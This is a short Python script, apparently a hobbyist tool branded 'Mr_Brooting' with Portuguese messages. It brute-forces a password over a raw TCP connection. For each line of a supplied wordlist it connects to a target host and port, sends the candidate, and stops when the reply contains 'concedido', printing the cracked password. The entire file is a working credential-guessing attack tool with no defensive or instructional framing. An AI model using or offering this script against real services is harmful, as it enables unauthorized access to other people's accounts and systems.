import socket
import pyfiglet
import sys

banner = pyfiglet.figlet_format('Mr_Brooting')
print(banner)

host = sys.argv[1]
port = sys.argv[2]
word = sys.argv[3]
try:

    wordlist = open(word)
    linhas = wordlist.readlines()
  
    for password in linhas:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host,int( port)))
            s.sendall(password.encode())
            data = s.recv(1024).decode()
            print(data)
            if "concedido" in data:
                print("\033[34m[Senha Quebra]:> \033[0m",password)  
                break
except socket.error as rr:
    print("\033[31mErro de conexão\033[0m",rr)
s.close()
